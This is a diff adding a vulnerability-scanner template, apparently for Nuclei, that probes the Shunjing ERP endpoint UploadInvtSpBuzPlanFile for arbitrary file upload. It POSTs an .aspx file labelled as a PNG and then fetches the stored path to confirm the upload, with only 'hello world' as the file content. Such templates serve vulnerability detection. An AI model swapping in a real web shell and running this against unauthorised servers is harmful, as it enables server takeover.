@@ -1,0 +1,55 @@
+id: poc-yaml-centersoft-uploadinvtspbuzplanfile-anyfile-upload
+
+info:
+  name: 顺景ERP管理系统UploadInvtSpBuzPlanFile存在任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    顺景ERP管理系统UploadInvtSpBuzPlanFile存在任意文件上传漏洞
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/api/cgInvtSp/UploadInvtSpBuzPlanFile"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+    body: |
+      ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+      Content-Disposition: form-data; name="file"; filename="1.aspx"
+      Content-Type: image/png
+
+      hello world
+      ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
+    extractors:
+      - type: regex
+        name: filepath
+        internal: true
+        part: body
+        regex:
+          - '"filepath":"(?P<path>.*?)"'
+        group: 1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"filepath\""
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/{{filepath}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello world"
